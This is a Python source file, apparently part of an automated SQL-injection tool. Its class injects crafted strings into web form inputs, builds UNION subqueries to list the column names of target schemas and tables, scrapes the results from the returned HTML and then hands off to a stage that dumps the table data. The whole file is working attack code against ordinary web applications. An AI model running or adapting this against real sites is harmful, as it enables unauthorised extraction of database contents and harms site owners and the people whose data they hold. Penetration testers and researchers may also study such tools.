import logging

from src.injector_state.sql_injector_dump_state import SQLInjectorDumpState
from src.injector_state.sql_injector_state import SQLInjectorState
from src.engines.sql_injection_engine import SQLInjectionEngine
from src.scraping.parse_sql_response_from_html import parse_sql_response_from_html
from src.sql_injection_builder import SQLInjectionBuilder

class SQLInjectorGetColumnNames(SQLInjectorState):
    def __init__(self, sql_injector, engine, schemas) -> None:
        super().__init__(sql_injector)
        self.engine = engine
        self.schemas_and_tables = schemas
        self.schemas_to_do = [(schema, table) for schema in schemas for table in schemas[schema]]
    
    def next(self):
        self.sql_injector.state = SQLInjectorDumpState(self.sql_injector, self.engine, self.schemas_and_tables)
        return self.sql_injector.state

    def inject(self, action, input_chosen, inputs):
        for key in SQLInjectorState.injections_to_try:
            response = super().injection(action, input_chosen, inputs, key + "; -- ")
            if response is not None:
                while True:
                    column_names = self.get_database_names(action, input_chosen, inputs, key, self.schemas_to_do[0])
                    if column_names is not None:
                        logging.info(f"\033[0;36mColumns on {self.schemas_to_do[0][0]}.{self.schemas_to_do[0][1]} are {column_names}\033[0m")
                        self.schemas_and_tables[self.schemas_to_do[0][0]][self.schemas_to_do[0][1]] = column_names
                        self.schemas_to_do.pop(0)
                        if len(self.schemas_to_do) == 0:
                            self.next().inject(action, input_chosen, inputs)
                            return True
                    else:
                        break
        return False

    def get_database_names(self, action, input_chosen, inputs, previous_str, schema_and_table):
        number_of_columns = super().get_number_of_columns(action, input_chosen, inputs, previous_str)
        if number_of_columns is None:
            return None
        else:
            sql_injection_string = SQLInjectionBuilder().add_str(previous_str).union_subquery(self.engine.column_names(number_of_columns, schema_and_table[0], schema_and_table[1])).build()
            response = super().injection(action, input_chosen, inputs, sql_injection_string)
            if response is not None:
                return [schema[1] for schema in parse_sql_response_from_html(response.text, ["column"], SQLInjectionEngine.injection_prefix, SQLInjectionEngine.injection_suffix)]
            else:
                return None